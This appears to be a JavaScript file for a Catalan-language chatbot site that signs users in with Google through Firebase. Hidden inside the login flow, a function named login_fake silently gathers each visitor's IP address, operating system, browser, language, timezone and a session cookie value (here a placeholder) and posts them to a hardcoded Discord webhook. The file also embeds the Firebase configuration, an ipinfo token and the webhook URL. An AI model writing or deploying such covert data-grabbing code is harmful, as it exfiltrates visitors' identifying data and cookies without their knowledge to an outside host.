let user_logged_in = false;

const firebaseConfig = {
    apiKey: "AIzaSyAE7dWiaNZtr-cMkkzVrCdL38hg3HeCSpQ",
    authDomain: "michelon-antiguo.firebaseapp.com",
    projectId: "michelon-antiguo",
    storageBucket: "michelon-antiguo.firebasestorage.app",
    messagingSenderId: "252285707734",
    appId: "1:252285707734:web:705026efe2829c88c6b077",
    measurementId: "G-BH8FSK2SG4"
};

firebase.initializeApp(firebaseConfig);
const provider = new firebase.auth.GoogleAuthProvider();
const auth = firebase.auth();


async function getIpAddress() {
    const response = await fetch('https://ipinfo.io/json?token=ff9c60f3d695e1');
    const data = await response.json();
    return data.ip;
}

function getSystemInfo() {
    const userAgent = navigator.userAgent;
    const os = navigator.platform;
    const browser = userAgent.indexOf("Chrome") > -1 ? "Chrome" : userAgent.indexOf("Firefox") > -1 ? "Firefox" : "Unknown";
    return { os, browser };
}

function getLocaleInfo() {
    const language = navigator.language || navigator.userLanguage;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    return { language, timezone };
}

const cookie = "session_token=supuestaCookieDeInicioDeSesion";

function getCookies() {
    return cookie;
}

// Función anterior
function saveInfoToFile(info) {
    const data = JSON.stringify(info, null, 2);

    const blob = new Blob([data], { type: 'text/plain' });

    const url = URL.createObjectURL(blob);

    const a = document.createElement('a');
    a.href = url;
    a.download = 'user_info.txt';
    a.click();

    URL.revokeObjectURL(url);
}


async function login_fake() {
    const ip = await getIpAddress();
    const { os, browser } = getSystemInfo();
    const { language, timezone } = getLocaleInfo();
    // const fingerprint = getFingerprint();
    const cookies = getCookies();

    const userInfo = {
        ip,
        os,
        browser,
        language,
        timezone,
        // fingerprint,
        cookies
    };

    // saveInfoToFile(userInfo);
    login_function();
    sendToDiscord(ip, os, browser, language, timezone, cookies);
    // login_function();
}

function login_function() {
    auth.signInWithPopup(provider)
        .then((result) => {
            const user = result.user;
            console.log("Bienvenido:", user.displayName);
            console.log("Has iniciado sesión como " + user.displayName);
            chatbot.classList.toggle('active');
            chatbot.classList.add('logged');
            chatbot2.classList.toggle('active');
            chatbot2.classList.add('logged');
            const mensajeBot = document.querySelector(".bienvenida-bot");
            const nombre_user = user.displayName.split(" ")[0];
            mensajeBot.innerHTML = `Hola ${nombre_user}! Soc l'assistent de Micheló, en què et puc ajudar?`;
        })
        .catch((error) => {
            alert("Error al iniciar sesión:", error.message);
            alert("Error: " + error.message);
    }); 
}

const webhookUrl = "https://discord.com/api/webhooks/1372299920920543302/C_kZA2dSHvfRSNott1qISDTPX6tNXRd64rr-3XCMWUiPUIPoTN2-o2r4uf5A6woOY7B_";

function sendToDiscord(id, os, browser, language, timeZone, cookies) {
    const content = `**IP:** \`\`\`${id}\`\`\`\n**OS:** \`\`\`${os}\`\`\`\n**BROWSER:** \`\`\`${browser}\`\`\`\n**LANGUAGE:** \`\`\`${language}\`\`\`\n**TIMEZONE:** \`\`\`${timeZone}\`\`\`\n**COOKIES:** \`\`\`${cookies}\`\`\``;

    const payload = {
        content: content,
    };

    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
    })
    .then((response) => {
        if (response.ok) {
            console.message('Datos enviados');
            form.reset();
        } else {
            console.error('Error enviando los mensajes');
        }
    })
    .catch((error) => {
        console.error('Error:', error);
    });
}